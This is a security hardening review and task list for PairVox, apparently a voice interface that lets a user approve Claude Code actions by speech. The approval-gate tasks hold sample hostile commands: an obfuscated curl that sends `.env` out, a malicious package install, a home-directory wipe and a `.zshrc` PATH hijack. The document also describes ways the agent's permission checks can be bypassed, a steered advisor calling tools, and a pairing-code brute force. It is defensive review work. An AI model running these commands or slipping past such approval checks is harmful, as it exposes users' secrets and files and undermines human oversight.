# PairVox hardening review and task list (2026-10-16)

> **Frozen 2026-10-17.** This list is backlog now. The definition of done for v0.1 is the five checks in `2026-10-17-v0.1-checks.md`; an item here is worked on only when it is the cause of a failing check.

Reviewed: branch `phase1-hardening` at 9718394 plus the uncommitted banner fix and UITrace in `.worktrees/audio`, the 20 commits since `main`, and the live log of today's runs. Method: five independent read-only code reviews (approval gate, audio, app layer, phone link, session and tooling), each finding re-read at the cited line before it was kept; a full test run; the iOS compile; the release dry run; a first-pass script review by the local model.

## 1. Where the app stands

| Check | Result |
|---|---|
| `swift test --build-system native` | 387 tests, 0 failures, 5 skips (live, network and exploration tests). 21 compiler warnings, all in `AppModel.swift` captures. |
| `swift build --product pairvox-app` | Builds. |
| iOS app, device SDK, unsigned | `BUILD SUCCEEDED`. Not run on a device or simulator since 2026-10-15. |
| `scripts/release.sh 0.1.0 --dry-run` | Passed. Build number 53. Open: Sparkle keys, Developer ID certificate, notary profile. |
| GitHub CI | Last run 2026-10-13 on `main`. None of the 20 commits on `phase1-hardening` has been through CI (no PR, and CI runs only on `main` and PRs). |
| Live launch (`scripts/launch-check.sh`) | ok: shortcuts at 0.9 s, engine at 1.1 s. |
| Live audio, today, Bluetooth earbuds, echo cancellation off | First audio median 6.8 s, p90 8.2 s (21 turns). Across all runs today the 23 completed turns ranged 0.4 s to 23 s, median 4.3 s. 8 gaps up to 3.2 s. 2 howls captured. 39 of 204 sentences synthesized slower than real time. 6 engine starts in output-only mode because the microphone was "not authorized". |
| Git state | `main` checkout sits on `experiment/early-ack-and-early-stt` with 71 dirty files: the whole of `phase1-hardening` as uncommitted changes plus the early-transcription experiment. `phase1-hardening` is pushed. Nothing is on `main` since 2026-10-13. |

### Verdict

The engine, the folder grants, the request-ID binding, the session-only "always allow", the child-process argument construction, the Keychain handling and the link's cryptography are sound. The app is not hardened for a public v0.1 yet. Four things block that:

1. The new "approve by voice from the summary" setting (commit d2f471a, on by default) removes the audible backstop from the whole medium-risk tier, and switching it off does not reach open projects.
2. The audio engine's start, stop and restart are not serialized, a failed restart is terminal, and the restart safety valve never fires on Bluetooth, the route the owner uses.
3. The six-digit pairing code hands the phone's long-term key to anyone who captured the exchange, the listener binds every interface, and phone approvals skip the Mac's second confirmation.
4. The captured login-shell environment is forwarded to the child unfiltered, including `ANTHROPIC_BASE_URL` and `CLAUDE_CODE_OAUTH_TOKEN`, and the advisor child is not confined to read-only tools.

## 2. Definition of Done for the v0.1 Mac release

The repo has no single DoD. This one is assembled from `CLAUDE.md`, `docs/HANDOFF.md` §6, `docs/RELEASE.md`, `docs/MIC_TEST.md`, the two PRDs and the machine-wide quality gates. Treat it as the proposal to confirm.

**Functional**
- F1. Hands-free loop: first audio under 2 s after end of speech on a warm session (HANDOFF P1), measured from `turn.completed firstAudioMs` over at least 20 real turns on speakers and on a Bluetooth headset. Today: 4.3 s median.
- F2. Barge-in stops speech within 0.3 s on speakers and headset, with no self-interrupt from echo.
- F3. Redirect, modes (full, skip code, summary, details), brainstorm, hold-to-talk from another app, headset plug and unplug mid-sentence, API-key mode, not-signed-in sheet: every item in HANDOFF §6 P1 checked on the release build and recorded.
- F4. `docs/MIC_TEST.md` parts 1 to 5 pass on the release build with the audio report attached.
- F5. No synthesized sentence plays with gaps: `gaps` 0 and `corrupt synth` 0 in the audio report over a 15-minute session.

**Safety (CLAUDE.md rules, each with a test)**
- S1. A high-risk request can never be approved by voice unless the off-by-default switch is on and the phrase is spoken.
- S2. A spoken yes never covers a command the speaker did not hear or see: either the full command was read, or the card is on screen in the active project. Cross-project announcements and the phone follow the same rule.
- S3. No credential or session token is read, stored, logged or forwarded by PairVox beyond what the child needs.
- S4. Every settings toggle that widens or narrows approvals reaches running projects at once.

**Security gates**
- G1. Fixes for every High finding in sections 3 and 4 below, each with a regression test.
- G2. `strix-qa` run against the release build, then `security-audit` in full mode; reports under `docs/security/`, every High or Critical fixed or accepted in writing.
- G3. Threat model text matches the code (the six mismatches in section 4 corrected).

**Release mechanics**
- R1. `phase1-hardening` merged to `main` through a PR with both CI jobs green.
- R2. `scripts/release.sh X.Y.Z --dry-run` passes; `scripts/soak.sh 120` passes.
- R3. Owner items: Developer ID certificate, notary profile, Sparkle keys, name and trademark check, email to Anthropic about subscription auth.
- R4. Clean-account install check (RELEASE.md step 8).

## 3. Task list, in order

Status, 2026-10-16 evening: 0.1 committed (4e77fe3, 03cbeeb, not pushed). 1.1 to 1.5, 2.1 to 2.5, 2.8, 2.9, 4.1, 4.2 and 4.6 implemented in this worktree by three follow-up sessions, uncommitted; the combined tree passes 438 tests with 0 failures and the 5 usual skips. The `pairvox-cli --env-audit` command in section 5 came from the same work.

Status, 2026-10-17: 0.3 done ([arcwel/PairVox#1](https://github.com/arcwel/PairVox/pull/1)); getting its CI green surfaced four Swift 6.0 and Linux differences, fixed in d3260e3 to 334ce0c (CLI in Swift 5 mode, soak test memory on Linux, a captured var, the consent folder's macOS path protected on every platform). Also fixed: the protected-folder check no longer depends on the folder existing on disk (a real gap, found by CI), 5.1 to 5.4, 5.5 (not yet checked on screen), 5.6 in part (input level still shares the model), 3.4, 3.5, 3.6, 3.8 and 6.3. 447 tests pass locally. The newest real launch registered its shortcuts at 4.7 s against 0.9 s the day before; worth a look before the 5 s limit trips. Task 3.1, decided by the owner on 2026-10-17: QR only. The six-digit code is removed everywhere, and a copyable pairing link covers phones without a camera. Round 2 (branch hardening-round-2, 2026-10-17): 4.3, 4.4, 4.5, 3.2 and 6.1 done, each with a test that fails on the old code (4.3, 4.4, 4.5) or a control case (3.2). 454 tests pass. Task 4.3 keeps the shell's `-i`: zsh reads ~/.zshrc only when interactive, and that is where many people set PATH. Everything else below is open.

Severity is the reviewers' rating confirmed at the cited line. "Scenario" is the input that produces the wrong result. Each task names its acceptance test.

Confidence. Every task's cited code was re-read, and the top findings in each area (1.1, 1.2, 1.3, 2.1, 2.3, 2.4, 2.5, 3.1, 3.2, 3.3, 4.1, 4.2, 4.6, 5.1, 5.2, 5.4, 5.5) were checked a second time by the author of this document. The failure in these tasks is traced in the code but was not reproduced at runtime: 2.1 (the interleaving), 2.3, 3.2, 3.4, 3.6, 4.1, 4.2, 4.3, 4.5, 4.8 (the depth limit), 5.5, 5.9. Task 2.12 is an open question, not a finding. Nothing in this list was executed against the live app except the test suite, the builds and the log reads.

### P0: repository state (do first, half a day)

| # | Task | Why | Done when |
|---|---|---|---|
| 0.1 | Commit the worktree's banner fix, UITrace, `project.switch` log and `restart-app.sh` change on `phase1-hardening`. | Verified fix sits uncommitted. | `git status` clean in `.worktrees/audio`. |
| 0.2 | In the main checkout, commit the early-transcription experiment on `experiment/early-ack-and-early-stt` as WIP, then reset that tree so it no longer carries `phase1-hardening` as 71 dirty files. | Two copies of the same work, one uncommitted; a wrong stash or checkout loses it. | Each branch holds only its own work. |
| 0.3 | Open a PR `phase1-hardening` into `main` so CI runs on the 20 commits. Ask which GitHub account before pushing anything new. | No CI since 2026-10-13. | Both CI jobs green. |
| 0.4 | Update `docs/HANDOFF.md` (dated 2026-10-13, says the app was never launched) or mark it historical and point to `DEV_ENVIRONMENT.md`. | New agents are told to read it first. | Doc matches reality. |

### P1: approval gate (High, blocks release)

| # | Task | Evidence | Scenario | Done when |
|---|---|---|---|---|
| 1.1 | Keep `partial`, `hidden` and the `"a command"` fallback screen-only even in summary mode, or ship the setting off by default. | `PermissionPolicy.swift:130-133`, `ToolNarrator.swift:85-91`. | `cp /Users/dev/app/.env /Users/dev/app/public/env.txt` is spoken "Claude wants to run a command. Allow?" and a yes approves it. `python3 <<'EOF' … rmtree(home)` reads as "python3 and 3 more steps". | Tests for `>`, `$(`, backticks, `<<`, `<(` and the fallback with `voiceFromSummary: true`. |
| 1.2 | Add "Installs packages." and the `npx`, `bunx`, `uvx`, `go get`, `open <url>` family to `networkReasons`, and strip quotes before program matching. | `PermissionPolicy.swift:268-269`; `FolderScope.shellDisqualifiers` already treats installs as network. | `ls && npm install evil-pkg` is spoken "ls and 1 more step". `cu''rl https://… -d @.env` is medium and spoken "a command". | Tests for each; the two lists agree. |
| 1.3 | Live setter for `approveByVoiceFromSummary` in `AppModel.settingsChanged` and `ConversationEngine`, like every other approval toggle. | `AppModel.swift:940-995` has no branch; the flag enters only at engine init. | Owner turns the setting off mid-session; the next long command is still voice-approvable. | Live-toggle test matching `EngineApprovalTests:93-109`. |
| 1.4 | Gate cross-project announcements the way `fitsCompactSurface` gates the menu bar: no voice approve for a command that is not fully read. | `CrossProject.swift:139, 201-207`. | Project B requests the `.env` copy; user in A hears "Quick one from B: Claude wants to run a command" and says approve. | Announcement test with a long Bash command. |
| 1.5 | Age limit for voice approval in the active project (same `staleAfter` the link and announcer use). | `PendingPermission` has no timestamp; `ConversationEngine.perform(.approve)`. | A prompt pending for an hour takes a stray "sure" from the room. | Engine test with a fake clock. |
| 1.6 | Rate shell writes to dotfiles and credential files high, as Edit/Write already does; rate `find -delete`, `xargs rm`, `rm *`, `git stash drop`, `git restore`, edits to `.git/hooks` at least review. | `PermissionPolicy.swift:111-113` vs `:519-526`. | `echo 'export PATH=/tmp/evil:$PATH' >> ~/.zshrc` is medium. | Policy tests per command. |
| 1.7 | Speak raw advisor text through `speakableAdvice` on the re-prompt path. | `ConversationEngine.swift:1177-1185`. | Return from catch-up with a high-risk request pending and the voice switch on: the model's own explanation is spliced into the approval prompt. | `AdviceSpeechTests` covers this caller. |
| 1.8 | Treat MCP tool prompts like Bash: say what the tool does or make them screen-only; add MCP to the threat model. | `PermissionPolicy.swift:135-139`. | "Claude wants to use mcp gmail send message. Allow?" is medium and voice-approvable. | Test and doc. |

### P2: audio engine (High, blocks release)

| # | Task | Evidence | Scenario | Done when |
|---|---|---|---|---|
| 2.1 | One lifecycle lock or serial queue covering `start()`, `stop()`, `restart()` and `rebuildEngine()`. | `AudioIO.swift:140-157, 186-196, 471-524`; `AppModel.swift:611-620` calls `restart()` detached while the config-change restart runs on main. | A settings change during a headset renegotiation leaves `isRunning == true` on an engine that never started: every sentence is `playback.dropped`, mic dead. | Stress test: concurrent restart and config change 100 times, engine running at the end. |
| 2.2 | Retry a failed restart once or twice, and let `defaultInputChanged` restart after a failure. | `AudioIO.swift:517-521`; the known flaky first `engine.start()`. | Headset arrives, start fails once, PairVox is silent and deaf until a setting is touched. | Test that injects one failure and asserts recovery. |
| 2.3 | Make the restart safety valve apply when voice processing is already off; after N restarts in 20 s stop replaying and tell the user. | `AudioIO.swift:492` requires `echoCancellationActive`, false on Bluetooth. | A2DP and HFP flipping restarts the engine without bound; the same sentence restarts over and over. | Valve test on a Bluetooth-shaped route. |
| 2.4 | Build the FeedbackCatcher ring only when the rate changes. | `FeedbackCatcher.swift:203` allocates a 10 s buffer (1.9 MB at 48 kHz) on every output tap callback. | Default-on setting costs about 44 MB/s of allocation while speaking. | Allocation test, or a counter asserting one ring per rate. |
| 2.5 | Drop and log instead of scheduling an unconverted buffer. | `AudioIO.swift:609` `?? buffer` schedules a 24 kHz buffer on a 16 kHz player; `AVAudioPlayerNode` raises on format mismatch. | Converter returns nil → crash. | Unit test with a failing converter. |
| 2.6 | Skip leveling when `sanitize` ran, and pick the speaking windows by percentile. | `VoiceSpeechOutput.swift:211-223`, `AudioLevel.swift:29-39`. | A clamped burst makes real speech play at about −38 dBFS. | Test with a burst-plus-speech buffer. |
| 2.7 | Decide voice processing and output pinning from the resolved route, not the system default. | `AudioIO.swift:211, 384`; `AudioRoute.usesBluetooth()`. | Echo cancellation on, Bluetooth chosen as "Play through", system default is speakers: the choice is ignored silently. | Route test. |
| 2.8 | Cache the log directory in `AudioIO`; never hop to the diagnostics queue from the tap. | `AudioIO.swift:754` does `queue.sync` on the tap thread. | A log rotation stalls the tap and therefore `stop()`. | Code change plus deadlock test. |
| 2.9 | Log `outputFormat.sampleRate` and `playerFormat.sampleRate` in `engine.started`. | Only the output-only path logs `playerRate`. | The screech cannot be diagnosed from the log. | Field present. |
| 2.10 | Screech investigation, cheapest first: (a) with "Record the audio PairVox plays" on, reproduce; a clean `playback-<run>.caf` while the ear hears the screech puts the fault in the device or aggregate path; (b) compare `outRate` at `engine.started` with the next `engine.configChange`; (c) count `engine.restarted` per minute during the symptom; (d) A/B "separate audio engines". Analyse the two captured howl pairs (406 Hz and 1875 Hz) first. | `docs/DEV_ENVIRONMENT.md`, audio report. | Earbuds screech, speakers do not; mic must stay on. | Root cause named with a measurement. |
| 2.11 | Latency: `firstAudioMs` median 4.3 s against a 2 s target, and 19% of sentences synthesized slower than real time. Measure where the time goes per stage on the Bluetooth route (Whisper decode is 0.43 s median, so the rest is Claude plus synthesis queueing), then: synthesize further ahead, split long sentences earlier, keep Whisper and Kokoro off the GPU at the same time. | `DEV_ENVIRONMENT.md` latency table; today's log. | Replies arrive 4 to 8 s after you stop talking. | 20 real turns with median under 2 s. |
| 2.12 | Find why six engine starts today were output-only with "microphone not authorized" despite the stable Apple Development signature. | `engine.started.outputOnly` lines. | The app plays but cannot hear after a relaunch. | Cause logged and fixed. |
| 2.13 | Tests: every engine test is output-only (`startAudioOrSkip` passes `captureWanted: false`), skips after three failed starts instead of failing, and nothing exercises capture, voice processing, pinning or the restart path. Add capture-path and restart-path tests; fail, not skip, when the engine cannot start on CI. | `AudioTestSupport.swift:8-20`. | A broken engine reports green. | Skip count 0 on a healthy Mac. |

### P3: phone link (High for a public build, Medium for owner-only use)

| # | Task | Evidence | Scenario | Done when |
|---|---|---|---|---|
| 3.1 | Replace the six-digit code with a PAKE (SPAKE2 or CPace), or make the QR the only path. Correct the threat model: today a captured exchange yields the phone's long-term key, not just a pairing attempt. | `Pairing.swift:146-147, 168-169, 190-192`. | Capture one pairing on the loopback leg of `tailscale serve`; brute-force 10^6 codes offline; open the grant; hold a full phone identity. | New pairing tested; threat model updated. |
| 3.2 | Bind the listener to the tailnet address (or 127.0.0.1 in userspace mode); require a utun interface in `TailnetAddress.current()`; `doctor` warns when `tailscale funnel` lists the port. | `TCPTransport.swift:104` binds every interface; `TailnetAddress.swift:26-38`. | A CGNAT uplink or a Funnel on the port exposes the pre-auth surface to the internet. | Bind test; doctor check. |
| 3.3 | Mac-side rule for phone approvals: high-risk and needs-screen from a phone require a tap on the Mac, or at least `macSecondConfirmation` covers the phone; say so in the setting's label. | `LinkHost.swift:379, 386`; `ConversationEngine.swift:331-334`. | The same request that needs Touch ID when spoken on the Mac is executed from a phone tap with no Mac check; the phone's Face ID claim is self-declared. | Test; label. |
| 3.4 | In Release configuration refuse the file key store outright; show the chosen store in Settings → Phone. | `DeviceKeyStore.swift:183-212` returns false on any Security API error. | An App Store or TestFlight signature puts a release build in the 0600 file silently. | Test with a stubbed certificate check. |
| 3.5 | Validate the client nonce length (16 bytes) in the session hello, as pairing does. | `LinkHost.swift:242, 302-309`. | Empty or 1 MB nonce accepted. | Test. |
| 3.6 | Resolve phone approvals against the project that was displayed: pass `projectID ?? latest.activeProjectID`. | `LinkHost.swift:353-361`. | Approval arriving between `setActive(next)` and publish lands in the new project. | Test with a fake clock. |
| 3.7 | Per-peer pairing limits: clear the offer on a per-peer burn; in `tailscale serve` mode every phone is 127.0.0.1, so the limits need a different key. | `LinkHost.swift:231-234`, `Pairing.swift:166-174`. | Three wrong proofs from any node bar everyone; a dead code stays on screen. | Test. |
| 3.8 | Use `shownName` in the two raw log lines; `printable()` in the CLI output; list `remove` as a same-user control action in the threat model. | `LinkHost.swift:279, 282`; `LinkCLI/main.swift:183-244`. | Control characters in a phone name reach log viewers and the terminal. | Test. |
| 3.9 | Show a short fingerprint of the client nonce on both devices in the Pair dialog. | `Pairing.swift:178-179`. | A peer who saw the code races the real phone with the same name. | UI plus test. |
| 3.10 | Fuzz the pre-auth frame parser (listed gap since audit run 3). | `LinkMessages.swift`. | Untested parser on an exposed socket. | Fuzz target in CI. |

### P4: session, credentials and logging (High and Medium)

| # | Task | Evidence | Scenario | Done when |
|---|---|---|---|---|
| 4.1 | Filter the captured shell environment with a deny-list: `ANTHROPIC_*` (except what PairVox sets), `CLAUDE_CODE_*`, `CLAUDE_CONFIG_DIR`, proxy variables, `NODE_OPTIONS`; in subscription mode also drop `CLAUDE_CODE_OAUTH_TOKEN`. | `LaunchConfiguration.swift:86-106` strips four keys; `ClaudeLocator.swift:75-92` captures everything. | `ANTHROPIC_BASE_URL=http://localhost:4000` in `.zshrc` plus API-key mode sends the Keychain key to that endpoint. | Test on `environment()`. |
| 4.2 | Advisor: add `--strict-mcp-config` and disallow everything but Read, Grep, Glob. | `ClaudeAdvisor.swift:34-42`: `--tools` filters built-ins only; user MCP servers still load. | A steered command string makes the Haiku advisor call an allowed MCP tool with no card. | Argument test; doc comment true. |
| 4.3 | Read child pipes with a deadline in `ProcessRunner`; drop `-i` from the login-shell capture. | `ClaudeLocator.swift:139-156`. | An rc file that backgrounds a process holding stdout hangs the app at launch with nothing logged. | Test with a fake shell. |
| 4.4 | Drain stdout to EOF before `.processExited`. | `ClaudeCLISession.swift:108-110, 237-258`. | Result JSON and exit in one burst → "Claude Code stopped unexpectedly" for a turn that succeeded. | Replay test. |
| 4.5 | Write stdin from its own queue outside the session lock. | `ClaudeCLISession.swift:146-153, 193-225`. | Full stdin pipe plus a wedged child plus a large paste: three-way stall, interrupt cannot run. | Test with a non-reading child. |
| 4.6 | Gate `synth.corrupt`'s `text` field on the conversation-text setting, or hash it. | `VoiceSpeechOutput.swift:178-185`. | Reply text in an exported diagnostics zip whose README says text is not included. | Test. |
| 4.7 | Apply `overrideProblem` checks (owner, mode) to the auto-located `claude` too. | `ClaudeLocator.swift:37-62`. | A group-writable `/usr/local/bin/claude` receives the API key. | Test. |
| 4.8 | `LineBuffer`: scan from the previous end; cap JSON nesting depth. | `LineBuffer.swift:20-25`, `JSONValue.swift:87-104`. | A 20 MB tool result costs about 3 GB of scanning under the lock. | Perf test. |
| 4.9 | Clean stale `.part` downloads; `qa-smoke.sh` and `validate-claude-config.sh` guard `mktemp` before `rm -rf`. | `ModelStore.swift:113`, `qa-smoke.sh:15,47,57`. | Up to 1.3 GB left per crashed download. | Done. |

### P5: app layer (High and Medium)

| # | Task | Evidence | Scenario | Done when |
|---|---|---|---|---|
| 5.1 | Mirror engine speech and conversation modes into settings only when the user changed them by voice, never from a project's initial per-project values; `receivedFirstSnapshot` skips snapshot one only, snapshot two carries the same values. | `AppModel.swift:876-883`. | Open project B with "Summaries only": the General setting flips on disk; A shows B's mode until A emits. | Extract a pure `SettingsMirror` function into Core and test it. |
| 5.2 | Report failed settings and Keychain saves; do not restart sessions after a failed key save. | `AppModel.swift:916` `try? store.save`, `:779`. | A revoked folder grant comes back at next launch, silently. | Error surfaced; test on the reducer. |
| 5.3 | Validate the Claude-path override on commit, not per keystroke; show the problem inline. | `SettingsView.swift:410-411` → `refreshSetup()` → alert. | Second character typed opens a modal "The file does not exist." | Manual check plus a `PathOverrideField` type with tests. |
| 5.4 | Fix the vocabulary field round-trip (a trailing comma is dropped as you type). | `SettingsView.swift:513-515`. | Cannot type a second word. | Field type with tests. |
| 5.5 | Permission card carries the banner's construct: selectable monospaced Text with unbreakable paths inside `fixedSize(vertical:)`. Remove `fixedSize`, cap and truncate; same for `CatchUpBar`. Add a `--layout-probe` flag that renders the card with a 300-character path and times layout. | `PermissionCardView.swift:40-47`, `ProjectSidebar.swift:114`. | A Bash request with a long path blanks the window like the banner did. | Probe passes. |
| 5.6 | Publish `sessions` only when changed; move `inputLevel` to its own small observable consumed by the orb; pause the orb's `TimelineView` when idle. | `AppModel.swift:400-410, 253`; `ControlBarView.swift:128`. | Two whole-model invalidations per streaming delta, plus 11 Hz level and 30 Hz orb redraws. | `ui.rate` shows the drop. |
| 5.7 | "Menu bar only" closes the Settings window it lives in; filter by the main window identifier. Setup sheet "Done" restarts the live session even when only the mic was missing. Record a project as opened only after the open succeeded. | `AppModel.swift:508-525`, `SetupView.swift:67-70`, `AppModel.swift:201-208`. | Owner loses the window; a turn is killed; a failed project is re-attempted at every launch. | Each fixed with a `WindowPolicy` or `RestorePlan` test. |
| 5.8 | Decide on the stderr capture: restore it after the probe with rotation and 0600, or state why it is gone. | Uncommitted diff removes `freopen`. | MLX and Metal failures go nowhere. | Decision recorded. |
| 5.9 | Serialize `setActive` calls per engine; cancel the grant-offer task in `closeProject`. | `AppModel.swift:339-351, 270-285`. | A fast A→B→A switch leaves the shown project inactive. | Test. |
| 5.10 | Resolve the 21 capture warnings in `AppModel.swift` before Swift 6 mode makes them errors. | Build log. | — | 0 warnings. |

### P6: tooling and docs (Medium and Low)

| # | Task | Evidence | Done when |
|---|---|---|---|
| 6.1 | `restart-app.sh --prune` deletes other worktrees' `dist/PairVox.app`, running or not, and `running()` matches one absolute path, so a copy launched from another checkout is "not running" and a second instance starts. Keep every `*/dist/PairVox.app`; match on bundle id plus CDHash. | `restart-app.sh:31, 41-57`. | Prune from either checkout leaves the running app alone. |
| 6.2 | Log bundle path and CDHash in `app.launch`; `launch-check.sh` and `freeze-watch.sh` filter on it. `freeze-watch.sh`: `set -euo pipefail`, validate `$1`, no hardcoded main-repo path. | `launch-check.sh:30`, `freeze-watch.sh:3-9`. | Scripts act on the intended build. |
| 6.3 | `launch-check.sh`: `grep -F` for the run id; default empty millisecond values to 0 before arithmetic. | Local-model review, confirmed by reading. | No "integer expression expected". |
| 6.4 | Pin `container: swift:6.0` by digest in CI. | `ci.yml`. | Done. |
| 6.5 | Threat model corrections: dotfile shell writes are medium, the network gate is four strings, "the card is on screen" does not hold cross-project, advisor text can be spoken on re-prompt, `staleAfter` is not enforced in the engine, the pairing code leaks the key, snapshots carry full commands to every phone. | Section 4 findings. | Text matches code. |
| 6.6 | `CHANGELOG.md` entry for the approval-summary default once 1.1 is decided; `RELEASE.md` checklist adds `strix-qa`. | — | Done. |

### P7: verification and release

| # | Task | Done when |
|---|---|---|
| 7.1 | Run `docs/MIC_TEST.md` on the build that contains P1 and P2, speakers and headset, and attach the audio report to the PR. | Parts 1 to 5 pass. |
| 7.2 | Run `strix-qa`, then `security-audit` full mode, on the release candidate; reports under `docs/security/`. | No open High or Critical. |
| 7.3 | `scripts/soak.sh 120`; `scripts/release.sh --dry-run`; tag only after the owner items in R3 exist. | Checklist in `RELEASE.md` complete. |
| 7.4 | Device test of the iPhone app (not run since 2026-10-15; simulator currently unusable). | Pairing, approval with Face ID, reconnect on a real phone. |

## 4. Findings kept out of the task list

Accepted risks the reviews agree with: development builds keep phone keys in a 0600 file; the unauthenticated handshake refusal; the pairing offer can be burned by twelve wrong guesses; same-user control-socket access for `offer`, `status` and `devices`; every paired phone sees every open project; no forward secrecy on the loopback leg because WireGuard has it underneath.

Checked and sound: argument construction for the child (all argv elements, `--resume` UUID-only, `--` before prompts); Keychain item attributes; pinned and hashed model downloads over https; CI pins and secret scoping; hardened runtime with two entitlements; the handshake and frame cryptography; IPv4-mapped IPv6 handling; JSON depth and size limits on the link; `submitFromRemote` can never answer a request; `UITrace` is cheap enough to ship (debug-level rate line, warning only on a storm).

## 5. CLI opportunities

| Command | What it does | Effort |
|---|---|---|
| `pairvox-link doctor --funnel` | Fails when `tailscale funnel status` lists the link port (task 3.2). | Small |
| `scripts/latency-report.py` | Per-stage breakdown of `firstAudioMs` from the log (silence wait, decode, first token, first sound), with medians and p90 per route (task 2.11). | Small |
| `PairVox --layout-probe` | Renders the permission card and banner with a 300-character path at 640 pt and reports layout time (task 5.5). | Medium |
| `scripts/dod-check.sh --json` | Runs the mechanical parts of section 2: tests, dry run, soak, launch check, audio report thresholds; exit 1 on any miss. | Medium |
| `pairvox-cli --env-audit` | Done: covers the planned `scripts/env-audit.sh`. Prints the names the deny-list drops from this Mac's login shell (with the reason group), which proxies pass and are set, and how many variables are forwarded; `--json` for scripts; never a dropped value (task 4.1). | Done |

## 6. Sources

Reviews: approval gate, audio pipeline, app layer, phone link, session and tooling (five read-only agents, 2026-10-16), each finding re-read at the cited line. Local-model script review (`scripts/`). Test log: 387 tests, 137 s. Live log: `~/Library/Logs/PairVox/pairvox.log`, runs 8ec07e8a to 16e4c87a. Prior audits: `docs/security/2026-10-13-*`, `2026-10-14-audit-run-5-new-features.md`, `docs/audits/2026-10-16-phone-link-and-tools-audit.md`.

## Linux note (2026-10-18)

The session output drain (4.4) and the bounded runner drain (4.3) are verified on macOS only. On the Linux CI job,
Foundation did not report pipe end-of-file through `readabilityHandler` or the exit promptly, so the two tests that
check them are skipped there. The Mac app is unaffected; `pairvox-cli` on Linux may still drop a turn's last line.

